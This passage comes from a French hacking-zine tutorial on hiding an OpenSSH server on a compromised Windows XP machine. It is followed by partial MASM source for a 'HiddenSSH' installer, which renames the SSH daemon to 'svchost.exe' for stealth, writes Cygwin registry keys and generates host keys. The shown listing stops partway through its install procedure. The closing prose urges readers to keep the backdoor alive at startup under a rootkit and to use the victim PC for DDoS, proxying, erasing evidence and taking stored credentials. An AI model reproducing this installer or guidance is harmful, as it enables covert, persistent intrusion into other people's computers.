+	  barbare, mais au moins, même si vos dll sont reperées, votre dossier
+	  sera toujours caché  et le doute  n'aura pas lieu :] ) On doit  donc
+	  copier les  différentes  dll de Cygwin dans  le répertoire system32.
+	  Arf, contrainte de plus, mais peu importe.
+
+	- Une fois ces DLL implantées, nous  sommes  tout prêt du but ! Il  ne
+	  nous reste plus qu'a installer  notre  service, et  ensuite, les dés
+	  sont jetés, et notre serveur SSH prêt a être utilisé. 
+
+	Soit,ca fait un peu long, tout ça ! A la main, ca risque d'être un peu
+long et difficile ... et si on programmait un ptit programme ( hu ),  histoire
+qu'il fasse tout ça a notre place ? On pourrait, effectivement :] Comme ça, on
+pourrait se creer un "mini-setup" en hide, c'est  une fichtre bonne idée, ça !
+:] Assembleur, nous voila ! 
+
+
+
+
+(~~ Partie VI : Création d'un auto-install caché en syntaxe MASM ~~)
+
+
+	Vous pourrez  trouver  le code du serveur  dans la section resource ..
+amusez vous bien a le compiler, il est legèrement commenté. Afin d'éviter trop
+d'utilisations abusives (car n'oublions pas qu'il 
+y a du pire  comme du meilleur sur l'internet, de l'utilisateur aux meilleures
+intentions  comme  le  pire lamer ... dommage. ), je  n'ai pas  codé la partie
+installant le service et les systèmes de run... je  vous souhaite donc bien du
+bonheur, vous avez le principal dans le pack, c'est a dire  un programme,  d'a
+peu près la même taille que le setup original, a l'exception qu'il  n'installe
+pas le service. Après,  les  clées  sont  générées, et le  serveur est  prêt a
+l'emploi :) Il ne vous  reste  donc plus  qu'a  chercher  un petit  moyen pour
+lancer discretement le serveur SSH ... pas si  compliqué,  je vous rassure. :]
+
+	Un petit manuel sur l'utilisation de ce serveur ? Soit, allons  y pour
+quelques explications sur sa conception et la manière de l'utiliser ! :]
+
+	Le principe de ce setup, comme tous les setup est d'avoir en resources
+ou en code directement les fichiers a créés,  qu'ils soit  compressés ou  non.
+Pour ce programme, j'ai utilisé la méthode des  resources, mais  j'aurais très
+bien pu utiliser une autre méthode, qui consiste a prendre le code hexadécimal
+de tout le programme et le mettre dans la section .code. Ensuite, en utilisant
+la fonction WriteFile,  on peut  réussir a  écrire  le code dans le fichier de
+notre choix, de telle  sorte  qu'on  obtient ben  ce que  l'on veut, a  savoir
+décompresser un fichier contenu dans l'exe, mais il ne sera pas dans la partie
+resource. C'est une manière de se proteger si l'on  veut,  disons que ca  peut
+éviter certains dump, comme pour  les  Builders  de  trojans,  qui,  pour 99%,
+contiennent  les  serveurs "vierges" dans la  section  Resource. On  peut donc
+aisemment les extraires et les modifier, avant de de nouveau les injecter dans
+le builder, pour generer  a  chaque  fois  des  serveurs  modifiés. C'est  une
+solution, ca peut aider certains mais le programmeur qui ne désire pas laisser
+cette chance peut très  bien s'il  le veut  prendre  le  code  du  programme a
+décompresser  et  le  crypter, et ensuite l'inclure dans la section  code,  de
+telle sorte qu'il sera difficile pour une lecture rapide du programme  compilé
+de retrouver le programme. C'est une protection qui peut être  utile,  mais ce
+n'est pas le  but de l'article ( qui sait, une autre fois peut être ? ), donc,
+fin de parenthèse. Afin d'utiliser ce programme, vous aurez  juste  besoin  de
+réponse aux questions qui sont posées,  et qui  sont  relativement  simples, a
+savoir le chemin où  installer  la  version  d'OpenSSH, le  reste  coulera  de
+source. Un programme pas compliqué a utiliser, mais qui peut  être  très  très
+utile. Cf la section "resource", qui contient le code source de ce sympathique
+programme ( quand je dis sympathique, pas la peine de l'inviter a table, il va
+pas vous tailler une bavette, ça l'empêche  pas  d'être un  minimum utile :) )
+Elle est un peu commentée, pas entièrement, mais  les parties  importantes  du
+programme sont commentées, rassurez vous.
+
+	Après  l'avoir  installé, et,  pour le fun, l'avoir  bien disposé pour
+qu'il soit lancé au démarrage a chaque fois, vous  devriez  pouvoir l'utiliser
+maintenant  a votre souhait ( même si vous n'avez pas éternué,  comprendra qui
+pourra ), et  donc,  vous  amusez  dessus. Ho,  je sais, vous auriez  pu aussi
+utiliser un shell, connexion directe ou reverse,  a  vous  de  voir,  histoire
+d'avoir un controle un tant soit peu constant, même si on a déja une  backdoor
+avec le rootkit ... un SSH, c'est quand même toujours mieux, na ! :]
+
+
+
+
+(~~ Partie VII : Petites Conclusions Entres Ami(e)s ~~)
+
+
+	Bon, voila, ça fait maintenant une heure et demie qu'on  se démène  et
+qu'on patine, on a atteint notre but si désiré ( ô délivrance ), et maintenant
+qu'on a obtenu un SSH discret et caché sur un serveur WinXP ... ben .. on fait
+quoi ? J'ai fait tout ça pour quoi ? Beaucoup s'attendront a une réponse  très
+précise et très pointue, pourtant, c'est une grande question ouverte : Les
+"non initiés" vous diront "ça sert a rien, juste a faire chier le mec .. c'est
+nul, vraiment", d'autres vous diront "ouaaah, c'est génial !", "top cool hyper
+méga tube que ça r0xe gr4ve sa m3re la p0mme de t3rre!", et autres expressions
+triviales, mais à nous, proprement  à nous, ça nous apporte quoi ? tout dépend
+de votre niveau, en réalité.  Certains, qui  connaissaient  déja ce  genre  de
+choses et n'ont pas attendu mon intervention pour  y penser, se diront  que ça
+leur a pas appris grand chose, ha si, peut être l'avantage d'un installeur SSH
+gratuit, hidden, et qui sera probablement dépassé a  l'heure où vous lirez ces
+lignes ( que voulez vous,  l'informatique, hein,  ça évolue  vite ),  mais qui
+pourra tout de même un jour vous être utile, sait on jamais ? A  ces  gens la,
+je leur dit un simple  merci  d'avoir  lu ce  texte, non pas merci de  l'avoir
+apprecié ou non, de l'avoir aimé ou pas, bien que cela fasse  toujours plaisir
+de se voir  gratifier  un "Merci c'était excellent", ce n'est pas forcément ça
+qui est le  but principal de quelqu'un qui écrit, et qui écrit souvent pour le
+plaisir pur  et dur d'écrire comme de partager,  après, peu importe la manière
+dont les gens  le percoivent. Je sais que les personnes "douées" qui liront ce
+paper n'apprendront  pas  grand  chose,  peut  être  une  astuce ou deux,  une
+technique supplémentaire, une explication de quelque  chose ? J'espère  qu'ils 
+ne ressortiront pas déçus de ce paper et surtout en auront tiré quelque chose.
+A d'autres,  moins  "doués" que ces  précedents,  ou qui n'avaient pas pensé a
+cette  exploitation possible de serveurs, je pense  que dans  ce cas, même  en
+étant  le  Mr  Boon  de  base ou bien un peu plus rompus a ces exercices, quel
+interêt a lire ce paper ? La  philosophie  que  j'adopterais a propos de cette
+question est que l'apprentissage est déja quelque chose  de bon. Que vous vous
+en serviez ou non,  que vous trouviez  ce  paper  génial  ou non, apprendre et
+avoir la chance de lire et avoir la chance d'avoir cette possibilité d'acceder
+au  savoir, rien que  l'apprentissage et le savoir que  l'on  peut obtenir  et
+accumuler est déja  quelque chose de gagné. Huhu, ne vous inquietez pas, je me
+trouve loin de vous  faire  cet  habituel  discours  que  l'on  vous  rabbache
+continuellement, "Oui, vous avez de la chance de pouvoir apprendre, pensez aux
+petits bengladeshiens qui  n'ont  même  pas  accès  a l'école !", ce genre  de
+discours, j'en ai soupé autant que vous. Dites vous simplement que rien que le
+fait de  savoir  est déja  un bonheur,  un  bonheur spirituel et qui peut déja
+changer votre  vie. Même  si vous n'y avez rien  gagné de concret, vous n'avez
+pas en face de vous a la fin de ce paper  une  pépite  d'or, un  hamburger, ou
+n'importe quel objet qui est apparu, savoir nourrir son esprit  d'une  manière
+équilibrée, pas trop de gras, ne pas trop en supprimer  non plus, pas  trop de
+sel, essuie toi la bouche, les mains sur la table... c'est déja quelque chose,
+sachons nous contenter de peu dans la dignité.
+
+	Bon, j'attends au détour  les détracteurs  qui me diront "bah, on s'en
+fout de tout ça, jvoulais gagner quelque chose a lire ton truc !", ils veulent
+du concret, ce que je pourrais  leur  dire de faire avec  ce SSH installé,  ce
+shell, ce serveur vulnérable ? Imaginez, vous pouvez absolument tout en faire,
+rien ne peut vous en empêcher du moment que vous savez comment le faire ... un
+proxy? Pourquoi pas, avec votre accès au PC vous pourrez effacer les dernières
+preuves. Un stro ? Pourquoi pas, s'il a assez de place ? Un petit serveur  FTP
+installé, couvert par le rootkit, et voila, le tour est  joué. Un  shell, tout
+simplement  ?  Pourquoi  pas  non plus ... un  "laboratoire", où vous  pourrez
+tester vos nouveaux programmes, que vous n'avez pas envie d'executer sur votre
+propre  machine ? Mais  pourquoi  pas !  Ne  laissez  aucune  limite  a  votre
+imagination, dites vous que si vous le voulez, vous le pourrez, en  mettant en
+oeuvre les moyens nécéssaires, il suffit simplement d'être motivé, de  vouloir
+le faire, de savoir où trouver ses  informations, et, plus  simplement, savoir
+quoi faire de ce PC, qui  est maintenant livré a vous. Vous pourrez  très bien
+vous en servir aussi comme un zombie (petite définition rapide : PC rooté dont
+vous faites ce que vous voulez, que ce soit du DDOS, un proxy,  un socks .. ),
+donc pour les DDOS, pourquoi pas, un bounce, pour  vos petites  opérations pas
+très légales, prendre des  informations qui selon  vous sont interessantes sur
+ce PC, tel  que le  "Protected Storage" ... rien ne vous limite,  vous pourrez
+même si vous le souhaitez vous en servir pour cracker du MD5 ( avec modération
+:] ), rien ne  vous en  empêche. Un  petit  upload, Hop,  tout est reglé.  Que
+désirer de plus qu'un PC qui vous appartient dorénavant, PC  où vous aurez  un
+controle absolument total ... soyez  créatifs, imaginatifs, et vous aurez tout
+ce que vous  voudrez ( enfin presque,  vous imaginez pas  voir  débarquer  une
+naïade en bikini dans votre salon simplement parce que vous l'aurez voulu très
+fort ;) )
+
+	N'oubliez pas non plus que quoi que vous fassiez de ce tutoriel, je ne
+suis en aucun cas responsable de ce que vous ferez, enfin, pour être franc, je
+m'interesse pas vraiment a ce que vous en ferez. Vous pouvez l'imprimer  et le
+manger en sauce avec un  peu de  mayonnaise, le  coller sur  les murs de votre
+chambre, l'envoyer dans une lettre anonyme a votre voisin ou bien en faire des
+petits avions en papier, peu m'importe, je pense que vous êtes aptes a décider
+de quoi faire, et savoir être responsable de ce  que vous  faites, assumer, en
+résumé. Pour simple protection légale,  je souligne  juste  que je ne suis pas
+responsable de ce que vous ferez, c'est tout :]
+
+	Voila, ce tutoriel est terminé, j'espère que vous l'aurez apprécié, je
+terminerais par cette phrase de Che Guevara,  qui résume les deux  paragraphes
+que j'ai écris plus haut, et qui est aussi le "slogan" de n0name :
+"Soyez réalistes, demandez l'impossible."
+
+	Bien le bonjour a ceux qui me connaissent, que leur vie soit longue,
+paisible, et heureuse ! Amusez vous bien avec tout ça :)
+
+
+
+HiddenSSH source code :
+
+.386
+.MODEL flat, stdcall
+
+OPTION CASEMAP:NONE 
+
+Include windows.inc
+Include kernel32.inc
+Include masm32.inc
+include shell32.inc
+include advapi32.inc
+
+Includelib advapi32.lib
+Includelib shell32.lib
+IncludeLib kernel32.lib
+IncludeLib masm32.lib
+
+.DATA
+; Here we declare all our text variables, statics
+sz_Intro1			DB	13,10," **************************************************************** ",\
+	                    13,10," *                 HiddenSSH Setup Special Edition              * ",\
+	                    13,10," **************************************************************** ",13,10,0
+	                    
+
+sz_Intro2			DB  13,10," /** HiddenSSH Installer is a HiddenSetup based on OpenSSH 3.8.1p-1",\
+	                    13,10,"     released on 2004-07-09 for Win32.For more informations, visit",\
+	                    13,10,"     http://sshwindows.sourceforge.net/",\
+	                    13,10,"     Thanks to them, without this project this setup will'nt be here.",\
+	                    13,10,\
+	                    13,10,"     Coded by Icingtaupe, for n0name mag#1, 100% in MASM.         **/",13,10,0
+
+
+sz_Install			DB	13,10," Do you want to install OpenSSH (yes/no) ? ",0
+sz_QueryPath		DB	" Please enter path where OpenSSH would be installed : ",0
+sz_InvalidPath		DB	" Error : Directory cannot be found.",13,10,\
+						" Would you like the setup create ",0
+sz_Registring		DB	13,10," Writing to registry ... please wait ...",13,10,0
+sz_Registre_OK		DB	" Ok, registry's update is done.",13,10,0
+sz_SlashAndAsk		DB	" ? ",0
+sz_ValidPath		DB	" Ok, directory set.",13,10,0 
+sz_DirFailed		DB	" Moving to directory failed. Please enter a valid path.",13,10,0
+sz_MovingTo			DB	" Moving to ",0
+sz_Creating			DB	" Creating directory ",0
+sz_Extracting		DB	" Extracting file ",0
+sz_CopyToWin		DB	" Cygwin dll a needed for the server. Do you want to copy",13,10,\
+						" them to the System32 directory ? ",0
+sz_AllDone			DB	" Ok, all done. Going to run exe files ...",13,10,0
+sz_Generating		DB	" Generating public / private keys ( could be long )...",13,10,0
+sz_Users			DB	" Adding users & groups ( could be long )...",13,10,0
+sz_Service_O		DB	13,10," Ok, Service Install Succeed.",0
+sz_Service_F		DB	13,10," Error : Service Install Failed. Please retry.",0
+sz_Launch			DB	13,10," Launching Service ",0
+sz_Service_Q		DB	13,10," What would be the name of the OpenSSH Service ? ",0
+sz_SetupDone		DB	13,10,13,10," Ok ! HiddenSSH Installer has finished his work.",\
+						13,10," You should be now able to log into OpenSSH Server with",\
+						13,10," password and login you defined or entered before running this setup.",\
+						13,10," If you hadn't entered name&login into Windows, please run mkpassd",\
+						13,10," and mkgroup again in order to refresh the server. Now, all should be fine.",\
+						13,10,13,10," Have a good day,",\
+						13,10," Icingtaupe.",13,10,0 
+						
+sz_OK				DB	"... OK",13,10,0
+sz_Failed			DB	"... Failed",13,10,0
+sz_AnswerY			DB	"yes",13,10,0
+sz_AnswerN			DB	"no",13,10,0
+sz_Slash			DB	"\",0
+sz_System32			DB	"\System32",0
+
+; OpenSSH folders
+sz_Bin				DB	"bin",0
+sz_Sbin				DB	"sbin",0
+sz_Share			DB	"share",0
+sz_TermInfo			DB	"terminfo",0
+sz_C				DB	"c",0
+sz_Etc				DB	"etc",0
+sz_Log				DB	"log",0
+sz_Run				DB 	"run",0
+sz_Tmp				DB	"tmp",0
+sz_Usr				DB	"usr",0
+sz_Var				DB	"var",0
+
+; Bin Files
+sz_Cygcrypto		DB	"cygcrypto-0.9.7.dll",0
+sz_Cygconv			DB	"cygiconv-2.dll",0
+sz_Cygminires		DB	"cygminires.dll",0
+sz_CygRunSrv		DB	"cygrunsrv.exe",0
+sz_cygrunsrv_1		DB	'cygrunsrv.exe -I "',0
+sz_cygrunsrv_2		DB	'" -p "/usr/sbin/sshd" -a "-D" --env "CYGWIN=binmode ntsec tty"',0
+sz_Cygwin			DB	"cygwin1.dll",0
+sz_Cygz				DB	"cygz.dll",0
+sz_Last				DB	"last.exe",0
+sz_MkGroup			DB	"mkgroup.exe",0
+sz_MkPasswd			DB	"mkpasswd.exe",0
+sz_MakeAll			DB	"makeall.bat",0
+sz_QuietCmd			DB	"quietcmd.bat",0
+sz_Scp				DB	"scp.exe",0
+sz_Sftp				DB	"sftp.exe",0
+sz_Sh				DB	"sh.exe",0
+sz_Ssh				DB	"ssh.exe",0    			
+sz_Ssh_add			DB	"ssh-add.exe",0
+sz_Ssh_agent		DB	"ssh-agent.exe",0
+sz_Ssh_keygen		DB	"ssh-keygen.exe ",0
+sz_keygen_1			DB	'ssh-keygen.exe -t dsa -f /etc/ssh_host_dsa_key -N "" -q',0
+sz_keygen_2			DB	'ssh-keygen.exe -t rsa1 -f /etc/ssh_host_key -N "" -q',0
+sz_keygen_3			DB	'ssh-keygen.exe -t rsa -f /etc/ssh_host_rsa_key -N "" -q',0
+sz_Ssh_keyscan		DB	"ssh-keyscan.exe",0
+sz_Switch			DB	"switch.exe",0
+
+; Sbin files
+sz_Sshd				DB	"svchost.exe",0				; Stealth Name for Sshd.exe, the Server Daemon
+sz_Sshd_serv			DB	"svchost.exe -D",0
+sz_Sftp_serv		DB	"sftp-server.exe",0
+sz_Ssh_key			DB 	"ssh-keysign.exe",0
+
+;Share\Terminfo\C File
+sz_Cygwin_C			DB	"cygwin",0
+
+;Etc Files
+sz_Sshd_config		DB	"sshd_config",0
+sz_Ssh_config		DB	"ssh_config",0
+sz_Moduli			DB	"moduli",0
+
+;Registry's info
+sz_CygKey			DB	"Software\Cygnus Solutions\Cygwin\",0
+sz_Mounts			DB	"mounts v2",0
+sz_Options			DB	"Program Options",0
+sz_Home				DB	"/home",0
+sz_Root_key			DB	"/",0
+sz_Usr_bin			DB	"/usr/bin",0
+
+sz_Flags_value		DB	0Ah, 00h, 00h ,00h
+sz_Flags			DB	"flags",0
+sz_Native			DB	"native",0
+
+sz_Blank			DB	" ",0
+
+.DATA?
+sz_SlashCleared		DB	250 dup(?)
+sz_RootPath			DB	250 dup(?)
+sz_WinPath			DB	250 dup(?)
+sz_AnswerBuf		DB	250 dup(?)
+sz_Path				DB	150 dup(?)
+sz_CurrentPath		DB	150 dup(?)
+
+
+
+sz_Temp				DB	10 dup(?)
+
+
+sz_Startup			STARTUPINFO<>
+sz_PInfo			PROCESS_INFORMATION<>	
+sz_BytesWritten		DD	?
+sz_BytesRead		DD	?
+sz_Directory		DD ?
+sz_File				DD	?
+sz_Root				DD	?
+
+hGroup				DD	?
+hPasswd				DD	?
+hReg_mounts			DD	?
+hReg_options		DD	?
+hReg_temp			DD	?
+hReg				DD	?
+hFile				DD 	?
+hRes				DD  ?
+hTemp				DD  ?
+
+.CODE
+Start:
+Push OFFSET sz_Intro1 				; From here we display all informations about this program
+Call StdOut
+
+Push OFFSET sz_Intro2				
+Call StdOut
+
+@Query:
+Push OFFSET sz_Install				; Here we display the query sentence ( Do you ? ... ),  and next, we wait for an entry
+Call StdOut
+
+Push LENGTHOF sz_AnswerBuf
+Push OFFSET sz_AnswerBuf
+Call StdIn
+
+Push OFFSET sz_AnswerBuf			; We ask for the length of the answer
+Call lstrlen
+
+	.IF EAX > 5						; If the answer if longer than Yes / No, we reset the buffer and re-ask
+	Push EAX
+	Push OFFSET sz_AnswerBuf
+	Call RtlZeroMemory
+	
+	Jmp @Query
+	.ENDIF 
+
+Push OFFSET sz_AnswerY				; We compare the answer to Yes
+Push OFFSET sz_AnswerBuf
+Call lstrcmpi
+
+	.IF EAX != 0					; If the answer is'nt yes
+	Push OFFSET sz_AnswerN			; Compare with "no"
+	Push OFFSET sz_AnswerBuf
+	Call lstrcmpi
+	
+ 		.IF EAX != 0				; If the answer isn't no ( and isn't yes, as seen above )
+ 		Push OFFSET sz_AnswerBuf
+ 		Call lstrlen
+ 		
+	 	Push EAX					; Reset the buffer and re-ask
+	 	Push OFFSET sz_AnswerBuf
+	 	Call RtlZeroMemory
+	 	
+	  	Jmp  @Query
+	  	
+	  	.ELSEIF EAX == 0			; If the answer is no, terminate the program
+	  	Jmp @End
+	 	.ENDIF
+	
+	.ELSEIF EAX == 0				; Else, if answer is yes, we go to install procedure
+	Call InstallProc
+	.ENDIF
+
+@End:
+Push 0
+Call ExitProcess
+
+
+
+InstallProc Proc
+
+	
+	@Begin:
+	Push OFFSET sz_QueryPath		; Here we ask for the path where OpenSSH wold be installed
+	Call StdOut
+	
+	Push LENGTHOF sz_AnswerBuf		; And we wait for an answer :)
+	Push OFFSET sz_AnswerBuf
+	Call StdIn
+	
+	Lea ESI, OFFSET sz_AnswerBuf	; We set adress for AnswerBuf & Path to respectively ESI and EDI registers
+	Lea EDI, OFFSET sz_Path
+	CLD								; We set the "mode" for LOSDB ( from the beginning of the buffer )
+	
+	
+	@ParsingEngine:					; Start point for Parsing Engine, a bit complicated, but work well :] Thanks to Tolwin for the LODSB tip
+	LODSB							; Load byte from ESI ( In fact, AnswerBuf ) in AL
+	Cmp  AL,13						; We compare AL to the caracter 13, mean "Enter"
+	Jnz  @NotEnter					; If this is not caracter 13, we jump to NotEnter
+	Jz   @EnterFound				; Else, if it is, we jump to EnterFound
+	
+	@NotEnter:						 
+	STOSB							; We store the value from AL to EDI ( here, to Path )
+	Test AL, AL						; We try to see if this is the end of the string ( If "Test Al, AL" return 0 )
+	Jne  @ParsingEngine				; If not, we return to the parsing engine, to see with another caracter
+	
+	@EnterFound:
+	Mov AL, 0						; We move "0", as the end value of the string to AL
+	STOSB							; We store AL in EDI, and that's all ! Our path is now clear from "entries" caracters.
+	
+	Push OFFSET sz_Path
+	Call SetCurrentDirectory		; Here we test for the existence of the path supplied
+	
+	.IF EAX == FALSE 				; If it doesn't exist
+	
+		@BadPath:
+		Push OFFSET sz_InvalidPath	; Hey man, it's not a good path ! The directory doesn't exist ! 
+		Call StdOut
+		
+		Push OFFSET sz_CurrentPath
+		Call StdOut
+		
+		Push OFFSET sz_Path
+		Call StdOut
+		
+		Push OFFSET sz_SlashAndAsk
+		Call StdOut
+		
+		Push LENGTHOF sz_Temp
+		Push OFFSET sz_Temp
+		Call StdIn					; Wait for a answer for the "We create the folder, or not ?"
+		
+		Push OFFSET sz_Temp
+		Push OFFSET sz_AnswerY
+		Call lstrcmpi				; Answer engine
+		
+		.IF EAX != 0					; If the answer is'nt yes
+		Push OFFSET sz_AnswerN			; Compare with "no"
+		Push OFFSET sz_Temp
+		Call lstrcmpi
+		
+	 		.IF EAX != 0				; If the answer isn't no ( blablabla ... )
+		 	Call CleanMem 	
+		  	Jmp  @BadPath
+		  	
+		  	.ELSEIF EAX == 0			; If the answer is no, we jump to the beginning after cleaned buffers
+		  	Call CleanMem
+		  	
+		  	Jmp  @Begin
+		 	.ENDIF
+		
+		.ELSEIF EAX == 0				; Else, if answer is yes, we just continue :)
+			Push OFFSET sz_Path			; We Create the folder indicate by the user's entrie
+			Call @CreateDir
+			
+				.IF EBX == FALSE		; Erf, failed to create directory
+				Call CleanMem			; We reset buffers
+				Jmp  @BadPath			; We re-ask for a path
+				.ENDIF 
+				
+			Push OFFSET sz_Path			; We go in this directory newly created
+			Call SetCurrentDirectory
+
+			Push OFFSET sz_ValidPath	; We say "Hey Ho, we are in the new directory !"
+			Call StdOut
+			
+			Jmp  @CreateFolders			; We jump to the next state :]
+		.ENDIF
+	
+	.ELSEIF EAX == TRUE
+		Push OFFSET sz_ValidPath		; Well, folder exist and so we say "It's exist". Clever program, isn't it ?
+		Call StdOut
+	
+	.ENDIF
+		
+	@CreateFolders:	
+	Push OFFSET sz_RootPath				; We get the root path of the OpenSSH System
+	Push MAX_PATH
+	Call GetCurrentDirectory
+	
+	; /************************************** Create Basic Folders ***********************************\
+	
+	Push OFFSET sz_Bin					; We create all folders, in calling "@Createdir" procedure ( "param" = OFFSET sz_Bin ) 
+	Call @CreateDir
+	
+	Push OFFSET sz_Usr					; Create the "usr" folder
+	Call @CreateDir
+	
+	Push OFFSET sz_Tmp					; Blahblah ...
+	Call @CreateDir
+	
+	Push OFFSET sz_Var
+	Call @CreateDir
+	
+	Push OFFSET sz_Etc
+	Call @CreateDir
+	
+	Push OFFSET sz_Bin
+	Call ChangeDir
+	
+	Mov  sz_File, 10					; Here we set the "base" number for the first file, it will be increased in the procedure ( same number as in resources )
+
+	; /************************************** Extract files to Bin ***********************************\
+	
+	Push OFFSET sz_Cygcrypto			; Give the argument "OFFSET sz_Cygcrypto" to the ExtractFile procedure, and launch here. It will give us the file. :]
+	Call ExtractFile
+	
+	Push OFFSET sz_Cygconv
+	Call ExtractFile
+
+	Push OFFSET sz_Cygminires
+	Call ExtractFile
+
+	Push OFFSET sz_CygRunSrv
+	Call ExtractFile
+
+	Push OFFSET sz_Cygwin
+	Call ExtractFile
+
+	Push OFFSET sz_Cygz
+	Call ExtractFile
+	
+	Push OFFSET sz_Last
+	Call ExtractFile
+
+	Push OFFSET sz_MkGroup
+	Call ExtractFile
+	
+	Push OFFSET sz_MkPasswd
+	Call ExtractFile
+
+	Push OFFSET sz_QuietCmd
+	Call ExtractFile
+	
+	Push OFFSET sz_Scp
+	Call ExtractFile
+
+	Push OFFSET sz_Sftp
+	Call ExtractFile
+
+	Push OFFSET sz_Sh
+	Call ExtractFile
+
+	Push OFFSET sz_Ssh
+	Call ExtractFile
+	
+	Push OFFSET sz_Ssh_add
+	Call ExtractFile
+	
+	Push OFFSET sz_Ssh_agent
+	Call ExtractFile
+	
+	Push OFFSET sz_Ssh_keygen
+	Call ExtractFile
+	
+	Push OFFSET sz_Ssh_keyscan
+	Call ExtractFile
+	
+	Push OFFSET sz_Switch
+	Call ExtractFile			; All files have been extracted
+	
+	Push OFFSET sz_MakeAll
+	Call ExtractFile
+	
+	; /**************************************  Extracting to Usr\Sbin ***********************************\
+	
+	Mov  sz_Root, 1
+	Push OFFSET sz_Usr
+	Call ChangeDir
+	
+	Mov  sz_Root,0
+	Push OFFSET sz_Sbin
+	Call @CreateDir
+	
+	Push OFFSET sz_Sbin
+	Call ChangeDir
+	
+	Push OFFSET sz_Sftp_serv
+	Call ExtractFile
+	
+	Push OFFSET sz_Sshd
+	Call ExtractFile	
+	
+	Push OFFSET sz_Ssh_key
+	Call ExtractFile
+	
+	; /**********************************  Create&Extract to Share\Terminfo\c *******************************\
+	
+	Mov  sz_Root, 1
+	Push OFFSET sz_Usr
+	Call ChangeDir
+	
+	Push OFFSET sz_Share
+	Call @CreateDir
+	
+	Mov  sz_Root, 0
+	Push OFFSET sz_Share
+	Call ChangeDir
+	
+	Push OFFSET sz_TermInfo
+	Call @CreateDir
+
+	Push OFFSET sz_TermInfo
+	Call ChangeDir
+	
+	Push OFFSET sz_C
+	Call @CreateDir
+	
+	Push OFFSET sz_C
+	Call ChangeDir
+	
+	Push OFFSET sz_Cygwin_C
+	Call ExtractFile
+	
+	; /**********************************  Create folders in "Var" *******************************\
+	Mov  sz_Root, 1
+	Push OFFSET sz_Var
+	Call ChangeDir
+	
+	Mov  sz_Root, 0
+	Push OFFSET sz_Log
+	Call @CreateDir
+	
+	Push OFFSET sz_Run
+	Call @CreateDir
+
+	; /**********************************  Extract into Etc *******************************\
+	
+	Mov sz_Root, 1
+	Push OFFSET sz_Etc
+	Call ChangeDir
+	
+	Push OFFSET sz_Sshd_config
+	Call ExtractFile
+	
+	Push OFFSET sz_Ssh_config
+	Call ExtractFile
+	
+	Push OFFSET sz_Moduli
+	Call ExtractFile
+
+	; /********************** Write informations in registry for Cygwin *************************\
+	Push OFFSET sz_Registring
+	Call StdOut
+	
+	Push OFFSET hReg				; Here we create all the keys we need for Cygwin
+	Push OFFSET sz_CygKey
+	Push HKEY_LOCAL_MACHINE
+	Call RegCreateKey
+	
+	Push OFFSET hReg_mounts
+	Push OFFSET sz_Mounts
+	Push hReg
+	Call RegCreateKey
+	
+	Push OFFSET hReg_options
+	Push OFFSET sz_Options
+	Push hReg
+	Call RegCreateKey
+	
+	Push OFFSET hReg_temp			; We now create the key "/"
+	Push OFFSET sz_Root_key
+	Push hReg_mounts
+	Call RegCreateKey			
+	
+	Push 4							; Write here the "flag" value, with "0000000a" as data ( 4 is the length of data )
+	Push OFFSET sz_Flags_value		; The value : 00h ...
+	Push REG_DWORD					; Type of key
+	Push 0
+	Push OFFSET sz_Flags			; Name of value
+	Push hReg_temp					; Handle for the key. Here, his name is "temp" because we use the same NAME ( not data ) for differents key, see later
+	Call RegSetValueEx				; We write key
+	
+	Push OFFSET sz_Path				; Calculate the lenght of the string "Path"
+	Call lstrlen
+
+	Push EAX						; Use it as the lenght for data of "native" value in "/"
+	Push OFFSET sz_Path
+	Push REG_SZ
+	Push 0
+	Push OFFSET sz_Native
+	Push hReg_temp
+	Call RegSetValueEx
+	
+	Push 10							; We reset the buffer "hReg_temp", to use it with a different key
+	Push OFFSET hReg_temp
+	Call RtlZeroMemory
+
+	Push OFFSET hReg_temp			; We now create the key "/usr/bin"
+	Push OFFSET sz_Usr_bin
+	Push hReg_mounts
+	Call RegCreateKey
+	
+	Push OFFSET sz_RootPath
+	Push OFFSET sz_SlashCleared		; We take the Install Path of OpenSSH; and add it to a buffer named SlashCleared 
+	Call lstrcat					; Rem : SlashCleared is empty at beginning. We So have : SlashCleeared = "C:\OpenSSH" for example
+	
+	Push OFFSET sz_Root_key			; We add a Slash to the string
+	Push OFFSET sz_SlashCleared		; SlashCleared = C:\OpenSSH/
+	Call lstrcat
+	
+	Push OFFSET sz_Bin				; We add the string "bin" to SlashCleared
+	Push OFFSET sz_SlashCleared		; SlashCleared = C:\OpenSSH/bin
+	Call lstrcat					; Ok, now our value is ready to be added
+	
+	Push OFFSET sz_SlashCleared		; We Calculate her length
+	Call lstrlen
+	
+	Push EAX						; Length of data
+	Push OFFSET sz_SlashCleared
+	Push REG_SZ						; Type of value
+	Push 0							; Reserved
+	Push OFFSET sz_Native			; Name of Data
+	Push hReg_temp					; Handle
+	Call RegSetValueEx
+	
+	Push 4							
+	Push OFFSET sz_Flags_value		
+	Push REG_DWORD					
+	Push 0
+	Push OFFSET sz_Flags			
+	Push hReg_temp
+	Call RegSetValueEx
+	
+	Push 10							; We reset the buffer "hReg_temp", to use it with a different key
+	Push OFFSET hReg_temp
+	Call RtlZeroMemory
+	
+	Push OFFSET hReg_temp			; We now create the key "/usr/bin"
+	Push OFFSET sz_Home
+	Push hReg_mounts
+	Call RegCreateKey
+	
+	Push 4							
+	Push OFFSET sz_Flags_value		
+	Push REG_DWORD					
+	Push 0
+	Push OFFSET sz_Flags			
+	Push hReg_temp
+	Call RegSetValueEx				; We add a new value, with the habitual 00000a data :]
+	
+	Push OFFSET sz_Path				; Calculate the lenght of the string "Path"
+	Call lstrlen
+
+	Push EAX						; Use it as the lenght for data of "native" value in "/"
+	Push OFFSET sz_Path
+	Push REG_SZ
+	Push 0
+	Push OFFSET sz_Native
+	Push hReg_temp
+	Call RegSetValueEx
+	
+	Push 1							; We now set the data of the unamed value under "Program Option" to a blank string
+	Push OFFSET sz_Blank
+	Push REG_SZ
+	Push 0
+	Push hReg_options
+	Call RegSetValue
+	
+	Push OFFSET sz_Registre_OK		; We say to the user "Hey, registry, it's done !" 
+	Call StdOut
+	
+	@CopyToWin:
+	Push OFFSET sz_CopyToWin		; We Say "Do you want to copy to Windows, guy ?"
+	Call StdOut
+	
+	Push 10
+	Push OFFSET sz_Temp
+	Call RtlZeroMemory				; We reset the buffer for the answer 
+	
+	Push LENGTHOF sz_Temp
+	Push OFFSET sz_Temp
+	Call StdIn						; We now wait for an answer for the user ... 
+	
+	Push OFFSET sz_Temp
+	Push OFFSET sz_AnswerY
+	Call lstrcmpi					; We compare it to the answer "Yes", followed by the two entries caracters
+		.IF EAX != 0
